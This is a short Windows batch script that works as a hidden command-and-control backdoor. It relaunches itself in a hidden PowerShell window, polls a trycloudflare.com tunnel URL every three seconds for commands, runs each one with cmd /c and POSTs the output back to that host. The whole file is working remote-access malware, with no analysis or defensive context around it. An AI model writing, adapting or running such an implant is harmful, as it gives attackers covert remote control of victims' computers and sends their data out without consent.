@echo off
if "%1"=="HIDDEN" goto :hidden_main
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'HIDDEN' -WindowStyle Hidden"
exit
:hidden_main

setlocal enabledelayedexpansion
set URL=https://horse-nhs-nowhere-fuel.trycloudflare.com
set LAST_CMD=

:loop
    timeout /t 3 /nobreak >nul
    
    rem Use a simpler method to get command
    curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>&1
    
    rem Read first line only
    set /p CMD=<%TEMP%\c2_raw.txt
    
    if "!CMD!"=="" goto loop
    if "!CMD!"=="WAITING" goto loop
    if "!CMD!"=="!LAST_CMD!" goto loop
    
    set LAST_CMD=!CMD!
    
    set TEMPFILE=%TEMP%\c2_output.txt
    cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
    
    if exist "!TEMPFILE!" (
        curl -X POST --data-binary @"!TEMPFILE!" --max-time 10 %URL% 2>nul
        del "!TEMPFILE!" 2>nul
    )
    
    set CMD=
goto loop
